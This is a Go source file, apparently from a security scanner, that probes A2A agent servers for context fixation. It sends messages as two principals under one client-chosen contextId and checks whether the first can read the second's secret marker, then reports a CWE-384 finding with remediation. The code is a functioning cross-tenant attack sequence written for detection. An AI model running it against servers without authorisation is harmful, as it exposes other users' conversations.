package a2a

import (
	"context"
	"fmt"

	"github.com/calbebop/batesian/internal/attack"
)

// ContextFixationExecutor tests whether an A2A server adopts a client-supplied
// conversation contextId and then merges a different principal's messages into
// it (rule a2a-context-fixation-001) - the A2A half of the session/task-ID
// fixation concern.
//
// Unlike a2a-multitenant-isolation-001 (object-level read of another principal's
// task by id) and a2a-delegation-integrity-001 (continuing another principal's
// task), the vector here is a CLIENT-CHOSEN contextId: the attacker fixes a
// context, the victim is steered onto it, and the attacker reads the victim's
// content because the server merged both principals' conversations under the
// pre-seeded id. It implements attack.ChainExecutor and publishes the fixed
// contextId to the Blackboard.
type ContextFixationExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-context-fixation", func(rc attack.RuleContext) attack.Executor {
		return NewContextFixationExecutor(rc)
	})
}

func NewContextFixationExecutor(r attack.RuleContext) *ContextFixationExecutor {
	return &ContextFixationExecutor{rule: r}
}

// Produces declares the artifact kinds this rule may publish.
func (e *ContextFixationExecutor) Produces() []attack.ArtifactKind {
	return []attack.ArtifactKind{attack.ArtifactContextID}
}

// Requires declares no upstream dependencies - this rule is a producer.
func (e *ContextFixationExecutor) Requires() []attack.ArtifactKind { return nil }

// Execute satisfies attack.Executor by running the chained logic against a
// throwaway blackboard, so the rule still works outside the engine.
func (e *ContextFixationExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	return e.ExecuteChained(ctx, target, opts, attack.NewBlackboard())
}

// ExecuteChained runs the context-fixation check.
func (e *ContextFixationExecutor) ExecuteChained(ctx context.Context, target string, opts attack.Options, bb *attack.Blackboard) ([]attack.Finding, error) {
	if len(opts.Principals) < 2 {
		return nil, nil
	}
	a, b := opts.Principals[0], opts.Principals[1]
	if a.Token == b.Token {
		return nil, nil
	}

	vars := attack.NewVars(target, opts.OOBListenerURL)
	endpoint, ok := resolveA2AEndpoint(ctx, attack.NewUnauthHTTPClient(opts, vars), vars.BaseURL)
	if !ok {
		return nil, attack.ErrInconclusive
	}

	clientA := principalClient(opts, vars, a)
	clientB := principalClient(opts, vars, b)
	unauthClient := attack.NewUnauthHTTPClient(opts, attack.NewVars(target, opts.OOBListenerURL))

	fixedCtx := "batesian-fixctx-" + vars.RandID
	marker := "batesian-secret-" + vars.RandID

	// Step 1: as A, send under a client-chosen contextId.
	taskA, returnedCtx := e.sendUnderContext(ctx, clientA, endpoint, a.Headers, fixedCtx, "batesian ctx-fix probe "+vars.RandID, vars.RandID)
	if taskA == "" || returnedCtx != fixedCtx {
		// Either not a responsive A2A server, or the server minted its own
		// contextId (did not honor the client-supplied one) - secure.
		return nil, nil
	}
	bb.Publish(attack.Artifact{Kind: attack.ArtifactContextID, Value: fixedCtx, Principal: a.Name, Producer: e.rule.ID})

	// Step 2: open-server discriminator. An unauthenticated message under the
	// fixed context must be rejected; if it is accepted, the server enforces no
	// auth at all (not fixation).
	if anonTask, _ := e.sendUnderContext(ctx, unauthClient, endpoint, nil, fixedCtx, "batesian anon "+vars.RandID, vars.RandID); anonTask != "" {
		return nil, nil
	}

	// Step 3: as victim B, send a secret marker under the SAME fixed context.
	taskB, _ := e.sendUnderContext(ctx, clientB, endpoint, b.Headers, fixedCtx, marker, vars.RandID)
	if taskB == "" {
		return nil, nil // B could not post (invalid creds) - cannot confirm a merge
	}

	// Step 4: as A, read the context back. Confirmed only if A can see B's marker.
	if !e.taskHistoryContains(ctx, clientA, endpoint, a.Headers, taskA, marker, vars.RandID) {
		return nil, nil
	}

	return []attack.Finding{e.finding(endpoint, a, b, fixedCtx, taskA, taskB)}, nil
}

// sendUnderContext sends a SendMessage carrying a client-supplied contextId,
// trying the A2A v1.0 shape first then the v0.3 slash-method shape. It returns
// the created task id and the contextId the server associated with it.
func (e *ContextFixationExecutor) sendUnderContext(ctx context.Context, c *attack.HTTPClient, endpoint string, extraHeaders map[string]string, contextID, text, randID string) (taskID, returnedCtx string) {
	v1Headers := map[string]string{"A2A-Version": "1.0"}
	for k, v := range extraHeaders {
		v1Headers[k] = v
	}
	resp, err := c.POST(ctx, endpoint, v1Headers, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-ctxfix-send-" + randID,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":      1, // USER
				"parts":     []interface{}{map[string]string{"text": text}},
				"messageId": "batesian-ctxfix-" + randID,
				"contextId": contextID,
			},
		},
	})
	if err != nil || !resp.IsAccepted() {
		resp, err = c.POST(ctx, endpoint, extraHeaders, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-ctxfix-send-" + randID,
			"method":  "message/send",
			"params": map[string]interface{}{
				"message": map[string]interface{}{
					"role":      "user",
					"parts":     []interface{}{map[string]string{"kind": "text", "text": text}},
					"messageId": "batesian-ctxfix-" + randID,
					"contextId": contextID,
				},
			},
		})
	}
	if err != nil || !resp.IsAccepted() {
		return "", ""
	}
	taskID, returnedCtx = extractTaskContext(resp.Body)
	return taskID, returnedCtx
}

// taskHistoryContains reads a task via GetTask (v1.0) / tasks/get (v0.3) and
// reports whether the returned history contains the given marker - i.e. the
// shared context exposed another principal's message.
func (e *ContextFixationExecutor) taskHistoryContains(ctx context.Context, c *attack.HTTPClient, endpoint string, extraHeaders map[string]string, taskID, marker, randID string) bool {
	v1Headers := map[string]string{"A2A-Version": "1.0"}
	for k, v := range extraHeaders {
		v1Headers[k] = v
	}
	resp, err := c.POST(ctx, endpoint, v1Headers, map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      "batesian-ctxfix-get-" + randID,
		"method":  "GetTask",
		"params":  map[string]interface{}{"id": taskID, "historyLength": 50},
	})
	if err != nil || !resp.IsAccepted() {
		resp, err = c.POST(ctx, endpoint, extraHeaders, map[string]interface{}{
			"jsonrpc": "2.0",
			"id":      "batesian-ctxfix-get-" + randID,
			"method":  "tasks/get",
			"params":  map[string]interface{}{"id": taskID, "historyLength": 50},
		})
	}
	if err != nil || !resp.IsAccepted() {
		return false
	}
	return resp.ContainsAny(marker)
}

// finding builds the confirmed context-fixation cross-principal disclosure.
func (e *ContextFixationExecutor) finding(endpoint string, attacker, victim attack.Principal, fixedCtx, taskA, taskB string) attack.Finding {
	return attack.Finding{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A server merges principals under a client-supplied contextId (context fixation)",
		Description: fmt.Sprintf(
			"The server adopted a client-chosen contextId (%q) instead of minting its own, and "+
				"then exposed principal %q's message to principal %q under that shared context: "+
				"%q read back the context (task %s) and saw %q's secret marker (task %s). An "+
				"attacker can fix a contextId, steer a victim onto it, and capture the victim's "+
				"messages and embedded context (CWE-384). An unauthenticated message under the "+
				"same context was rejected, so this is a cross-principal fixation, not an open "+
				"server.", fixedCtx, victim.Name, attacker.Name, attacker.Name, taskA, victim.Name, taskB),
		Evidence: fmt.Sprintf(
			"fixed contextId: %s (client-supplied, honored by server)\nattacker: %s (tenant %s)\n"+
				"victim: %s (tenant %s)\nattacker task: %s\nvictim task: %s\n"+
				"unauthenticated message under context: rejected\n"+
				"victim's marker visible to attacker via shared context: yes",
			fixedCtx, attacker.Name, attacker.Tenant, victim.Name, victim.Tenant, taskA, taskB),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
		Chain: []attack.ChainStep{
			{Hop: 1, Principal: attacker.Name, Action: "send under a client-chosen contextId " + fixedCtx, Outcome: "server honored the client-supplied contextId"},
			{Hop: 2, Principal: victim.Name, Action: "send a secret message under the same contextId", Outcome: "victim's message stored in the fixed context"},
			{Hop: 3, Principal: attacker.Name, Action: "read the fixed context back", Outcome: "GRANTED - read the victim's message via the shared context"},
		},
	}
}
